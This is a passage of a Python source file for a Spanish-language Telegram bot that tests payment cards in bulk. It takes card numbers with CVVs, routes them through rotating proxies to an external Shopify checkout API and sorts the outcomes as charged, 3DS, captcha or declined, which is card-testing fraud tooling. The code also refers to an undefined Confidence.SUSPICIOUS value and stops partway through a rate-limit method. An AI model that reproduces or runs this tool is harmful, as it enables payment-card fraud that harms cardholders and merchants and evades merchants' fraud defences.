# -*- coding: utf-8 -*-
"""
Bot de Telegram para verificar tarjetas - VERSIÓN CON CLASIFICACIÓN MEJORADA
Basado en reglas precisas: CHARGED, 3DS, CAPTCHA, DECLINED, UNKNOWN
"""

import os
import json
import logging
import asyncio
import time
import random
import sqlite3
import re
from typing import Dict, List, Tuple, Optional, Any
from datetime import datetime
from dataclasses import dataclass, field
from enum import Enum
import signal
import sys

from telegram import Update, Document, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
import aiohttp

# ================== MANEJO DE SEÑALES ==================
def handle_shutdown(signum, frame):
    logger.info(f"🛑 Recibida señal {signum}, cerrando gracefulmente...")
    sys.exit(0)

signal.signal(signal.SIGTERM, handle_shutdown)
signal.signal(signal.SIGINT, handle_shutdown)

# ================== CONFIGURACIÓN ==================
class Settings:
    """Configuración global del bot"""
    TOKEN = os.environ.get("BOT_TOKEN")
    if not TOKEN:
        raise ValueError("❌ ERROR: BOT_TOKEN no está configurado")

    API_ENDPOINTS = [
        os.environ.get("API_URL", "https://auto-shopify-api-production.up.railway.app/index.php"),
        os.environ.get("API_URL2", "https://auto-shopify-api-production.up.railway.app/index.php"),
        os.environ.get("API_URL3", "https://auto-shopify-api-production.up.railway.app/index.php"),
    ]

    DB_FILE = os.environ.get("DB_FILE", "bot_database.db")
    MAX_WORKERS_PER_USER = int(os.environ.get("MAX_WORKERS", 8))
    RATE_LIMIT_SECONDS = int(os.environ.get("RATE_LIMIT", 2))
    DAILY_LIMIT_CHECKS = int(os.environ.get("DAILY_LIMIT", 1000))
    MASS_LIMIT_PER_HOUR = int(os.environ.get("MASS_LIMIT", 3))
    MASS_COOLDOWN_MINUTES = 0  # SIN COOLDOWN
    ADMIN_IDS = [int(id) for id in os.environ.get("ADMIN_IDS", "").split(",") if id]

    # Configuración de timeouts
    TIMEOUT_CONFIG = {
        "connect": 5,           # Proxy malo muere rápido
        "sock_connect": 5,
        "sock_read": 45,        # Shopify puede tardar
        "total": None,           # NO matar procesos válidos
        "response_body": 45,    
        "bin_lookup": 2,
    }

# ================== LOGGING ==================
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

INSTANCE_ID = os.environ.get("RAILWAY_DEPLOYMENT_ID", str(time.time()))

# ================== ENUMS MEJORADOS ==================
class CheckStatus(Enum):
    # Éxito real
    CHARGED = "charged"
    
    # Bloqueos / Autenticación
    CAPTCHA_REQUIRED = "captcha_required"
    THREE_DS_REQUIRED = "3ds_required"
    WAF_BLOCK = "waf_block"
    RATE_LIMIT = "rate_limit"
    BLOCKED = "blocked"
    
    # Declinados
    DECLINED = "declined"                    # Confirmado
    DECLINED_LIKELY = "declined_likely"      # Probable
    
    # Errores de red (NO son decline)
    CONNECT_TIMEOUT = "connect_timeout"      # Proxy murió
    READ_TIMEOUT = "read_timeout"             # Body lento
    SITE_DOWN = "site_down"
    
    # Respuesta ambigua
    UNKNOWN = "unknown"

class Confidence(Enum):
    HIGH = "HIGH"
    MEDIUM = "MEDIUM"
    LOW = "LOW"
    CONFIRMED = "CONFIRMED"

# ================== DATACLASSES ==================
@dataclass
class Job:
    site: str
    proxy: str
    card_data: Dict
    job_id: int
    created_at: datetime = field(default_factory=datetime.now)

@dataclass
class JobResult:
    job: Job
    status: CheckStatus
    confidence: Confidence
    reason: str
    response_time: float
    http_code: Optional[int]
    response_text: str
    success: bool
    bin_info: Dict = field(default_factory=dict)
    price: str = "N/A"
    patterns_detected: List[str] = field(default_factory=list)

# ================== CLASIFICADOR MEJORADO ==================
class ResponseClassifier:
    """
    Clasifica respuestas según reglas estrictas:
    1️⃣ ERRORES DE RED
    2️⃣ CAPTCHA / WAF
    3️⃣ 3DS / AUTENTICACIÓN
    4️⃣ CHARGED (solo si es real)
    5️⃣ DECLINED CONFIRMADO
    6️⃣ DECLINED PROBABLE
    7️⃣ UNKNOWN
    """
    
    # Patrones de CHARGED (REAL)
    CHARGED_PATTERNS = {
        "thank_you": re.compile(r'thank\s*you', re.I),
        "order_confirmed": re.compile(r'order\s*confirmed|order\s*#\d+', re.I),
        "receipt": re.compile(r'receipt|invoice', re.I),
        "payment_complete": re.compile(r'payment\s*complete|transaction\s*complete', re.I),
        "success_page": re.compile(r'success|successful', re.I),
    }
    
    # Patrones de CAPTCHA / WAF
    CAPTCHA_PATTERNS = {
        "captcha": re.compile(r'captcha|recaptcha', re.I),
        "challenge": re.compile(r'challenge.*js|js.*challenge', re.I),
        "cloudflare": re.compile(r'cloudflare|cf-ray', re.I),
        "access_denied": re.compile(r'access\s*denied|access\s*blocked', re.I),
        "ddos": re.compile(r'ddos|protection', re.I),
    }
    
    # Patrones de 3DS
    THREE_DS_PATTERNS = {
        "3ds": re.compile(r'3ds|3d\s*secure', re.I),
        "verified_by_visa": re.compile(r'verified\s*by\s*visa', re.I),
        "mastercard_secure": re.compile(r'mastercard.*secure|securecode', re.I),
        "amex_safe": re.compile(r'american\s*express.*safe|safe.*amex', re.I),
        "acs": re.compile(r'acs|access\s*control\s*server', re.I),
        "redirect_3ds": re.compile(r'redirect.*3ds|3ds.*redirect', re.I),
    }
    
    # Patrones de DECLINED CONFIRMADO
    DECLINED_CONFIRMED = {
        "insufficient_funds": re.compile(r'insufficient\s*funds|insufficient.*balance', re.I),
        "no_balance": re.compile(r'not\s*enough\s*balance|low\s*balance', re.I),
        "cvv_error": re.compile(r'cvv.*incorrect|invalid.*cvv', re.I),
        "expired": re.compile(r'expired\s*card|card.*expired', re.I),
        "do_not_honor": re.compile(r'do\s*not\s*honor', re.I),
        "payment_declined": re.compile(r'payment.*declined|transaction.*declined', re.I),
    }
    
    # Patrones de DECLINED PROBABLE (rápido/genérico)
    DECLINED_LIKELY = {
        "http_402": re.compile(r'402', re.I),
        "fast_reject": re.compile(r'declined|rejected|denied', re.I),
        "generic_error": re.compile(r'error.*payment|payment.*error', re.I),
    }
    
    @classmethod
    def classify(cls, context) -> Tuple[CheckStatus, Confidence, str, List[str]]:
        patterns_detected = []
        
        # ===== 1️⃣ ERRORES DE RED =====
        if context.http_code is None:
            if context.response_time < Settings.TIMEOUT_CONFIG["connect"]:
                return CheckStatus.CONNECT_TIMEOUT, Confidence.CONFIRMED, "proxy_failed", ["connect_timeout"]
            else:
                return CheckStatus.READ_TIMEOUT, Confidence.CONFIRMED, "slow_response_no_body", ["read_timeout"]
        
        if context.http_code >= 500:
            return CheckStatus.SITE_DOWN, Confidence.HIGH, f"server_error_{context.http_code}", [f"http_{context.http_code}"]
        
        # ===== 2️⃣ CAPTCHA / WAF =====
        response_lower = context.response_text.lower()
        
        for block_type, pattern in cls.CAPTCHA_PATTERNS.items():
            if pattern.search(response_lower):
                patterns_detected.append(f"captcha:{block_type}")
                return CheckStatus.CAPTCHA_REQUIRED, Confidence.HIGH, "captcha_challenge_detected", patterns_detected
        
        # ===== 3️⃣ 3DS / AUTENTICACIÓN =====
        for auth_type, pattern in cls.THREE_DS_PATTERNS.items():
            if pattern.search(response_lower):
                patterns_detected.append(f"3ds:{auth_type}")
                return CheckStatus.THREE_DS_REQUIRED, Confidence.HIGH, "authentication_challenge", patterns_detected
        
        # ===== 4️⃣ CHARGED (solo si es real) =====
        charged_matches = []
        price_matches = extract_price(context.response_text)
        
        for charged_type, pattern in cls.CHARGED_PATTERNS.items():
            if pattern.search(response_lower):
                charged_matches.append(charged_type)
                patterns_detected.append(f"charged:{charged_type}")
        
        # Condiciones para CHARGED real:
        # - Tiene al menos un patrón de éxito
        # - Tiempo > 3s (no instantáneo sospechoso)
        # - HTTP 200
        if charged_matches and context.http_code == 200:
            if context.response_time > 3.0:
                if price_matches != "N/A":
                    return CheckStatus.CHARGED, Confidence.HIGH, "confirmed_checkout", patterns_detected + [f"price_{price_matches}"]
                else:
                    return CheckStatus.CHARGED, Confidence.HIGH, "confirmed_checkout", patterns_detected
            else:
                # Respuesta muy rápida con patrones de éxito - sospechoso
                patterns_detected.append("fast_success_suspicious")
        
        # ===== 5️⃣ DECLINED CONFIRMADO =====
        for decline_type, pattern in cls.DECLINED_CONFIRMED.items():
            if pattern.search(response_lower):
                patterns_detected.append(f"declined:{decline_type}")
                return CheckStatus.DECLINED, Confidence.HIGH, f"{decline_type.replace('_', ' ')}", patterns_detected
        
        # ===== 6️⃣ DECLINED PROBABLE =====
        # HTTP 402 Payment Required
        if context.http_code == 402:
            return CheckStatus.DECLINED_LIKELY, Confidence.MEDIUM, "http_402_payment_required", ["http_402"]
        
        # Respuesta rápida (<1s) con mensaje genérico
        if context.response_time < 1.0:
            for likely_type, pattern in cls.DECLINED_LIKELY.items():
                if pattern.search(response_lower):
                    patterns_detected.append(f"likely:{likely_type}")
                    return CheckStatus.DECLINED_LIKELY, Confidence.MEDIUM, "fast_rejection", patterns_detected
        
        # ===== 7️⃣ UNKNOWN =====
        # Si hay respuesta pero no coincide con nada
        if context.response_text and len(context.response_text) > 100:
            return CheckStatus.UNKNOWN, Confidence.LOW, "unrecognized_response", ["has_response_no_pattern"]
        
        return CheckStatus.UNKNOWN, Confidence.LOW, "no_clear_pattern", ["ambiguous"]

# ================== FUNCIONES AUXILIARES ==================
def get_status_emoji(status: CheckStatus) -> str:
    emoji_map = {
        CheckStatus.CHARGED: "✅",
        CheckStatus.CAPTCHA_REQUIRED: "🤖",
        CheckStatus.THREE_DS_REQUIRED: "🔒",
        CheckStatus.WAF_BLOCK: "🛡️",
        CheckStatus.RATE_LIMIT: "⏳",
        CheckStatus.BLOCKED: "🚫",
        CheckStatus.DECLINED: "❌",
        CheckStatus.DECLINED_LIKELY: "⚠️",
        CheckStatus.CONNECT_TIMEOUT: "⏱️",
        CheckStatus.READ_TIMEOUT: "⏱️",
        CheckStatus.SITE_DOWN: "🌐",
        CheckStatus.UNKNOWN: "❓",
    }
    return emoji_map.get(status, "❓")

def get_confidence_icon(confidence: Confidence) -> str:
    icon_map = {
        Confidence.HIGH: "🔴",
        Confidence.MEDIUM: "🟡",
        Confidence.LOW: "🟢",
        Confidence.CONFIRMED: "🔴",
    }
    return icon_map.get(confidence, "⚪")

def format_time(seconds: float) -> str:
    minutes = int(seconds // 60)
    secs = int(seconds % 60)
    if minutes > 0:
        return f"{minutes}m {secs}s"
    return f"{secs}s"

def extract_price(text: str) -> str:
    try:
        patterns = [
            r'\$?(\d+\.\d{2})',
            r'Price["\s:]+(\d+\.\d{2})',
            r'amount["\s:]+(\d+\.\d{2})',
            r'total["\s:]+(\d+\.\d{2})',
        ]
        for pattern in patterns:
            match = re.search(pattern, text, re.I)
            if match:
                return f"${match.group(1)}"
    except:
        pass
    return "N/A"

def create_progress_bar(current: int, total: int, width: int = 20) -> str:
    if total == 0:
        return "[" + "░" * width + "]"
    filled = int((current / total) * width)
    bar = "█" * filled + "░" * (width - filled)
    return f"[{bar}]"

# ================== CACHÉ DE BIN ==================
BIN_CACHE = {}
BIN_CACHE_LOCK = asyncio.Lock()
BIN_SESSION = None
BIN_SESSION_LOCK = asyncio.Lock()

async def get_bin_session() -> aiohttp.ClientSession:
    global BIN_SESSION
    async with BIN_SESSION_LOCK:
        if BIN_SESSION is None or BIN_SESSION.closed:
            timeout = aiohttp.ClientTimeout(total=Settings.TIMEOUT_CONFIG["bin_lookup"])
            BIN_SESSION = aiohttp.ClientSession(timeout=timeout)
        return BIN_SESSION

async def get_bin_info(bin_code: str) -> Dict:
    async with BIN_CACHE_LOCK:
        if bin_code in BIN_CACHE:
            cache_time, data = BIN_CACHE[bin_code]
            if (datetime.now() - cache_time).total_seconds() < 86400:
                return data
    
    try:
        session = await get_bin_session()
        async with session.get(f"https://lookup.binlist.net/{bin_code}") as resp:
            if resp.status == 200:
                try:
                    data = await asyncio.wait_for(resp.json(), timeout=Settings.TIMEOUT_CONFIG["bin_lookup"])
                    result = {
                        "bank": data.get("bank", {}).get("name", "Unknown"),
                        "brand": data.get("scheme", "Unknown").upper(),
                        "country": data.get("country", {}).get("alpha2", "UN"),
                        "type": data.get("type", "Unknown"),
                    }
                    
                    async with BIN_CACHE_LOCK:
                        BIN_CACHE[bin_code] = (datetime.now(), result)
                    
                    return result
                except asyncio.TimeoutError:
                    logger.debug(f"Timeout leyendo BIN {bin_code}")
    except Exception as e:
        logger.debug(f"Error consultando BIN {bin_code}: {e}")
    
    default = {"bank": "Unknown", "brand": "UNKNOWN", "country": "UN", "type": "Unknown"}
    async with BIN_CACHE_LOCK:
        BIN_CACHE[bin_code] = (datetime.now(), default)
    return default

# ================== VALIDACIÓN DE TARJETAS ==================
class CardValidator:
    @staticmethod
    def luhn_check(card_number: str) -> bool:
        def digits_of(n):
            return [int(d) for d in str(n)]
        digits = digits_of(card_number)
        odd_digits = digits[-1::-2]
        even_digits = digits[-2::-2]
        checksum = sum(odd_digits)
        for d in even_digits:
            checksum += sum(digits_of(d * 2))
        return checksum % 10 == 0

    @staticmethod
    def validate_expiry(month: str, year: str) -> bool:
        try:
            exp_month = int(month)
            exp_year = int(year)
            if len(year) == 2:
                exp_year += 2000
            now = datetime.now()
            if exp_year < now.year:
                return False
            if exp_year == now.year and exp_month < now.month:
                return False
            return True
        except:
            return False

    @staticmethod
    def validate_cvv(cvv: str) -> bool:
        return cvv.isdigit() and len(cvv) in (3, 4)

    @staticmethod
    def parse_card(card_str: str) -> Optional[Dict]:
        parts = card_str.split('|')
        if len(parts) != 4:
            return None
        number, month, year, cvv = parts
        if not number.isdigit() or len(number) < 13 or len(number) > 19:
            return None
        if not CardValidator.luhn_check(number):
            return None
        if not CardValidator.validate_expiry(month, year):
            return None
        if not CardValidator.validate_cvv(cvv):
            return None
        return {
            "number": number,
            "month": month,
            "year": year,
            "cvv": cvv,
            "bin": number[:6],
            "last4": number[-4:]
        }

# ================== DETECCIÓN INTELIGENTE ==================
def detect_line_type(line: str) -> Tuple[str, Optional[str]]:
    line = line.strip()
    if not line:
        return None, None

    if line.startswith(('http://', 'https://')):
        rest = line.split('://')[1]
        if '.' in rest and not rest.startswith('.') and ' ' not in rest:
            return 'site', line

    if not line.startswith(('http://', 'https://')):
        parts = line.split(':')
        
        if len(parts) == 2:
            host, port = parts
            if port.isdigit() and 1 <= int(port) <= 65535:
                if re.match(r'^[a-zA-Z0-9\.\-_]+$', host):
                    return 'proxy', line
        
        elif len(parts) == 4:
            host, port, user, password = parts
            if port.isdigit() and 1 <= int(port) <= 65535:
                if re.match(r'^[a-zA-Z0-9\.\-_]+$', host):
                    return 'proxy', line
        
        elif len(parts) == 3 and parts[2] == '':
            host, port, _ = parts
            if port.isdigit() and 1 <= int(port) <= 65535:
                if re.match(r'^[a-zA-Z0-9\.\-_]+$', host):
                    return 'proxy', line

    if '|' in line:
        parts = line.split('|')
        if len(parts) == 4:
            numero, mes, año, cvv = parts
            if (numero.isdigit() and len(numero) >= 13 and len(numero) <= 19 and
                mes.isdigit() and 1 <= int(mes) <= 12 and
                año.isdigit() and len(año) in (2, 4) and
                cvv.isdigit() and len(cvv) in (3, 4)):
                if CardValidator.luhn_check(numero):
                    return 'card', line

    return None, None

# ================== BASE DE DATOS ==================
class Database:
    def __init__(self, db_path=Settings.DB_FILE):
        self.db_path = db_path
        self._write_lock = asyncio.Lock()
        self._batch_queue = []
        self._batch_lock = asyncio.Lock()
        self._batch_task = None
        self._initialized = False
        
    def _init_db_sync(self):
        with sqlite3.connect(self.db_path) as conn:
            conn.execute("PRAGMA journal_mode=WAL")
            cursor = conn.cursor()
            
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS users (
                    user_id INTEGER PRIMARY KEY,
                    sites TEXT DEFAULT '[]',
                    proxies TEXT DEFAULT '[]',
                    cards TEXT DEFAULT '[]',
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS learning (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,
                    site TEXT,
                    proxy TEXT,
                    bin TEXT,
                    attempts INTEGER DEFAULT 0,
                    successes INTEGER DEFAULT 0,
                    declines INTEGER DEFAULT 0,
                    timeouts INTEGER DEFAULT 0,
                    blocks INTEGER DEFAULT 0,
                    total_time REAL DEFAULT 0,
                    last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    UNIQUE(user_id, site, proxy, bin)
                )
            ''')
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_learning_user ON learning(user_id)')
            
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS results (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,
                    card_bin TEXT,
                    card_last4 TEXT,
                    site TEXT,
                    proxy TEXT,
                    status TEXT,
                    confidence TEXT,
                    reason TEXT,
                    response_time REAL,
                    http_code INTEGER,
                    price TEXT,
                    bin_info TEXT,
                    patterns TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_results_user ON results(user_id)')
            
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS rate_limits (
                    user_id INTEGER PRIMARY KEY,
                    last_check TIMESTAMP,
                    checks_today INTEGER DEFAULT 0,
                    last_mass TIMESTAMP,
                    mass_count_hour INTEGER DEFAULT 0,
                    last_reset DATE DEFAULT CURRENT_DATE
                )
            ''')
            
            conn.commit()

    async def initialize(self):
        if self._initialized:
            return
        loop = asyncio.get_event_loop()
        await loop.run_in_executor(None, self._init_db_sync)
        self._batch_task = asyncio.create_task(self._batch_processor())
        self._initialized = True
        logger.info(f"✅ Base de datos inicializada [Instancia: {INSTANCE_ID}]")

    async def _batch_processor(self):
        while True:
            try:
                await asyncio.sleep(5)
                if self._batch_queue:
                    async with self._batch_lock:
                        batch = self._batch_queue.copy()
                        self._batch_queue.clear()
                    
                    async with self._write_lock:
                        await self._execute_batch(batch)
            except asyncio.CancelledError:
                break
            except Exception as e:
                logger.error(f"Error en batch processor: {e}")

    async def _execute_batch(self, batch: List[tuple]):
        try:
            loop = asyncio.get_event_loop()
            await loop.run_in_executor(None, self._sync_execute_batch, batch)
        except Exception as e:
            logger.error(f"Error en batch insert: {e}")

    def _sync_execute_batch(self, batch: List[tuple]):
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            cursor.executemany(
                """INSERT INTO results 
                   (user_id, card_bin, card_last4, site, proxy, status, confidence,
                    reason, response_time, http_code, price, bin_info, patterns)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                batch
            )
            conn.commit()

    async def save_job_result(self, user_id: int, result: JobResult):
        patterns_json = json.dumps(result.patterns_detected)
        async with self._batch_lock:
            self._batch_queue.append((
                user_id, 
                result.job.card_data['bin'], 
                result.job.card_data['last4'],
                result.job.site, 
                result.job.proxy, 
                result.status.value,
                result.confidence.value, 
                result.reason, 
                result.response_time,
                result.http_code, 
                result.price, 
                json.dumps(result.bin_info),
                patterns_json
            ))

    async def update_learning(self, user_id: int, result: JobResult):
        weight = 1.0
        if result.confidence in [Confidence.LOW, Confidence.SUSPICIOUS]:
            weight = 0.3
        elif result.confidence == Confidence.MEDIUM:
            weight = 0.7
        
        existing = await self.fetch_one(
            "SELECT * FROM learning WHERE user_id = ? AND site = ? AND proxy = ? AND bin = ?",
            (user_id, result.job.site, result.job.proxy, result.job.card_data['bin'])
        )
        
        if existing:
            attempts = existing["attempts"] + 1
            successes = existing["successes"] + (weight if result.success else 0)
            declines = existing["declines"] + (weight if "decline" in result.status.value else 0)
            timeouts = existing["timeouts"] + (weight if "timeout" in result.status.value else 0)
            blocks = existing["blocks"] + (weight if result.status in [CheckStatus.BLOCKED, CheckStatus.WAF_BLOCK, CheckStatus.RATE_LIMIT] else 0)
            total_time = existing["total_time"] + result.response_time
            
            await self.execute(
                """UPDATE learning SET 
                   attempts = ?, successes = ?, declines = ?, timeouts = ?, blocks = ?,
                   total_time = ?, last_seen = CURRENT_TIMESTAMP
                   WHERE id = ?""",
                (attempts, successes, declines, timeouts, blocks, total_time, existing["id"])
            )
        else:
            await self.execute(
                """INSERT INTO learning 
                   (user_id, site, proxy, bin, attempts, successes, declines, timeouts, blocks, total_time)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                (user_id, result.job.site, result.job.proxy, result.job.card_data['bin'], 1,
                 weight if result.success else 0,
                 weight if "decline" in result.status.value else 0,
                 weight if "timeout" in result.status.value else 0,
                 weight if result.status in [CheckStatus.BLOCKED, CheckStatus.WAF_BLOCK, CheckStatus.RATE_LIMIT] else 0,
                 result.response_time)
            )

    async def execute(self, query: str, params: tuple = ()):
        async with self._write_lock:
            loop = asyncio.get_event_loop()
            return await loop.run_in_executor(None, lambda: self._sync_execute(query, params))

    def _sync_execute(self, query: str, params: tuple):
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            cursor.execute(query, params)
            conn.commit()
            return cursor

    async def fetch_one(self, query: str, params: tuple = ()):
        loop = asyncio.get_event_loop()
        return await loop.run_in_executor(None, lambda: self._sync_fetch_one(query, params))

    def _sync_fetch_one(self, query: str, params: tuple):
        with sqlite3.connect(self.db_path) as conn:
            conn.row_factory = sqlite3.Row
            cursor = conn.cursor()
            cursor.execute(query, params)
            row = cursor.fetchone()
            return dict(row) if row else None

    async def fetch_all(self, query: str, params: tuple = ()):
        loop = asyncio.get_event_loop()
        return await loop.run_in_executor(None, lambda: self._sync_fetch_all(query, params))

    def _sync_fetch_all(self, query: str, params: tuple):
        with sqlite3.connect(self.db_path) as conn:
            conn.row_factory = sqlite3.Row
            cursor = conn.cursor()
            cursor.execute(query, params)
            return [dict(row) for row in cursor.fetchall()]

    async def cleanup_old_results(self, days: int = 7):
        await self.execute(
            "DELETE FROM results WHERE created_at < date('now', ?)",
            (f"-{days} days",)
        )

    async def shutdown(self):
        if self._batch_task:
            self._batch_task.cancel()
            try:
                await self._batch_task
            except asyncio.CancelledError:
                pass
        global BIN_SESSION
        if BIN_SESSION and not BIN_SESSION.closed:
            await BIN_SESSION.close()

    # ===== NUEVO MÉTODO get_stats DENTRO DE LA CLASE =====
    async def get_stats(self, user_id: int) -> Dict:
        """Obtiene estadísticas del usuario"""
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            
            cursor.execute("SELECT COUNT(*) FROM results WHERE user_id = ?", (user_id,))
            total = cursor.fetchone()[0]
            
            cursor.execute("SELECT COUNT(*) FROM results WHERE user_id = ? AND status = 'charged'", (user_id,))
            charged = cursor.fetchone()[0]
            
            cursor.execute("SELECT COUNT(*) FROM results WHERE user_id = ? AND status = 'declined'", (user_id,))
            declined = cursor.fetchone()[0]
            
            cursor.execute("SELECT COUNT(*) FROM results WHERE user_id = ? AND status = 'declined_likely'", (user_id,))
            declined_likely = cursor.fetchone()[0]
            
            cursor.execute("SELECT COUNT(*) FROM results WHERE user_id = ? AND status LIKE '%timeout%'", (user_id,))
            timeout = cursor.fetchone()[0]
            
            cursor.execute("SELECT COUNT(*) FROM results WHERE user_id = ? AND status = 'captcha_required'", (user_id,))
            captcha = cursor.fetchone()[0]
            
            cursor.execute("SELECT COUNT(*) FROM results WHERE user_id = ? AND status = '3ds_required'", (user_id,))
            three_ds = cursor.fetchone()[0]
            
            cursor.execute("SELECT COUNT(*) FROM results WHERE user_id = ? AND status = 'unknown'", (user_id,))
            unknown = cursor.fetchone()[0]
            
            return {
                "total": total,
                "charged": charged,
                "declined": declined,
                "declined_likely": declined_likely,
                "timeout": timeout,
                "captcha": captcha,
                "three_ds": three_ds,
                "unknown": unknown
            }

# ================== PROXY HEALTH CHECKER ==================
class ProxyHealthChecker:
    def __init__(self, db: Database, user_id: int):
        self.db = db
        self.user_id = user_id
        self.test_url = "https://httpbin.org/ip"
        self.timeout = aiohttp.ClientTimeout(
            total=None,
            connect=Settings.TIMEOUT_CONFIG["connect"],
            sock_read=10
        )
        
    async def check_proxy(self, proxy: str) -> Dict:
        start_time = time.time()
        result = {
            "proxy": proxy,
            "alive": False,
            "response_time": 0,
            "error": None,
            "ip": None,
        }
        
        try:
            proxy_parts = proxy.split(':')
            if len(proxy_parts) == 4:
                proxy_url = f"http://{proxy_parts[2]}:{proxy_parts[3]}@{proxy_parts[0]}:{proxy_parts[1]}"
            else:
                proxy_url = f"http://{proxy_parts[0]}:{proxy_parts[1]}"
            
            async with aiohttp.ClientSession(timeout=self.timeout) as session:
                async with session.get(self.test_url, proxy=proxy_url) as resp:
                    if resp.status == 200:
                        elapsed = time.time() - start_time
                        result["alive"] = True
                        result["response_time"] = elapsed
                        try:
                            data = await resp.json()
                            result["ip"] = data.get("origin", "Unknown")
                        except:
                            pass
        except Exception as e:
            result["error"] = str(e)[:50]
        
        return result
    
    async def check_all_proxies(self, proxies: List[str], max_concurrent: int = 25) -> List[Dict]:
        semaphore = asyncio.Semaphore(max_concurrent)
        
        async def check_with_semaphore(proxy):
            async with semaphore:
                return await self.check_proxy(proxy)
        
        tasks = [check_with_semaphore(p) for p in proxies]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        final_results = []
        for i, res in enumerate(results):
            if isinstance(res, Exception):
                final_results.append({
                    "proxy": proxies[i],
                    "alive": False,
                    "response_time": 0,
                    "error": str(res),
                    "ip": None
                })
            else:
                final_results.append(res)
        
        return final_results

# ================== EJECUTOR DE JOBS ==================
class JobExecutor:
    @staticmethod
    async def execute(job: Job, session: aiohttp.ClientSession) -> JobResult:
        card_data = job.card_data
        card_str = f"{card_data['number']}|{card_data['month']}|{card_data['year']}|{card_data['cvv']}"
        params = {"site": job.site, "cc": card_str, "proxy": job.proxy}
        
        start_time = time.time()
        
        # Obtener info de BIN
        bin_info = await get_bin_info(card_data['bin'])
        
        try:
            api_endpoint = random.choice(Settings.API_ENDPOINTS)
            
            # Configurar proxy
            proxy_parts = job.proxy.split(':')
            if len(proxy_parts) == 4:
                proxy_url = f"http://{proxy_parts[2]}:{proxy_parts[3]}@{proxy_parts[0]}:{proxy_parts[1]}"
            elif len(proxy_parts) == 3 and proxy_parts[2] == '':
                proxy_url = f"http://{proxy_parts[0]}:{proxy_parts[1]}"
            elif len(proxy_parts) == 2:
                proxy_url = f"http://{job.proxy}"
            else:
                proxy_url = None
            
            try:
                if proxy_url:
                    async with session.get(api_endpoint, params=params, proxy=proxy_url) as resp:
                        elapsed = time.time() - start_time
                        try:
                            response_text = await asyncio.wait_for(resp.text(), timeout=Settings.TIMEOUT_CONFIG["response_body"])
                        except asyncio.TimeoutError:
                            response_text = ""
                else:
                    async with session.get(api_endpoint, params=params) as resp:
                        elapsed = time.time() - start_time
                        try:
                            response_text = await asyncio.wait_for(resp.text(), timeout=Settings.TIMEOUT_CONFIG["response_body"])
                        except asyncio.TimeoutError:
                            response_text = ""
                            
            except asyncio.TimeoutError:
                elapsed = time.time() - start_time
                if elapsed < Settings.TIMEOUT_CONFIG["connect"]:
                    return JobResult(
                        job=job,
                        status=CheckStatus.CONNECT_TIMEOUT,
                        confidence=Confidence.CONFIRMED,
                        reason="proxy_failed",
                        response_time=elapsed,
                        http_code=None,
                        response_text="",
                        success=False,
                        bin_info=bin_info,
                        price="N/A"
                    )
                else:
                    return JobResult(
                        job=job,
                        status=CheckStatus.READ_TIMEOUT,
                        confidence=Confidence.CONFIRMED,
                        reason="slow_response_no_body",
                        response_time=elapsed,
                        http_code=None,
                        response_text="",
                        success=False,
                        bin_info=bin_info,
                        price="N/A"
                    )
            
            # Crear contexto para clasificador
            class Context:
                pass
            
            context = Context()
            context.http_code = resp.status if 'resp' in locals() else None
            context.response_time = elapsed
            context.response_text = response_text if 'response_text' in locals() else ""
            context.response_size = len(response_text) if 'response_text' in locals() else 0
            
            # Clasificar respuesta
            status, confidence, reason, patterns = ResponseClassifier.classify(context)
            price = extract_price(response_text) if 'response_text' in locals() else "N/A"
            success = (status == CheckStatus.CHARGED)
            
            return JobResult(
                job=job,
                status=status,
                confidence=confidence,
                reason=reason,
                response_time=elapsed,
                http_code=resp.status if 'resp' in locals() else None,
                response_text=response_text if 'response_text' in locals() else "",
                success=success,
                bin_info=bin_info,
                price=price,
                patterns_detected=patterns
            )
            
        except Exception as e:
            elapsed = time.time() - start_time
            logger.error(f"Error en job {job.job_id}: {e}")
            return JobResult(
                job=job,
                status=CheckStatus.UNKNOWN,
                confidence=Confidence.LOW,
                reason=f"error: {str(e)[:50]}",
                response_time=elapsed,
                http_code=None,
                response_text=str(e),
                success=False,
                bin_info=bin_info,
                price="N/A"
            )

# ================== USER MANAGER ==================
class UserManager:
    def __init__(self, db: Database):
        self.db = db
        self._rate_lock = asyncio.Lock()

    async def get_user_data(self, user_id: int) -> Dict:
        row = await self.db.fetch_one(
            "SELECT sites, proxies, cards FROM users WHERE user_id = ?",
            (user_id,)
        )
        
        if not row:
            await self.db.execute(
                "INSERT INTO users (user_id, sites, proxies, cards) VALUES (?, ?, ?, ?)",
                (user_id, '[]', '[]', '[]')
            )
            return {"sites": [], "proxies": [], "cards": []}
        
        return {
            "sites": json.loads(row["sites"]),
            "proxies": json.loads(row["proxies"]),
            "cards": json.loads(row["cards"])
        }

    async def update_user_data(self, user_id: int, sites=None, proxies=None, cards=None):
        current = await self.get_user_data(user_id)
        
        if sites is not None:
            current["sites"] = sites
        if proxies is not None:
            current["proxies"] = proxies
        if cards is not None:
            current["cards"] = cards
        
        await self.db.execute(
            "UPDATE users SET sites = ?, proxies = ?, cards = ? WHERE user_id = ?",
            (json.dumps(current["sites"]), json.dumps(current["proxies"]), 
             json.dumps(current["cards"]), user_id)
        )

    async def check_rate_limit(self, user_id: int, command: str) -> Tuple[bool, str]:
        async with self._rate_lock:
            today = datetime.now().date()
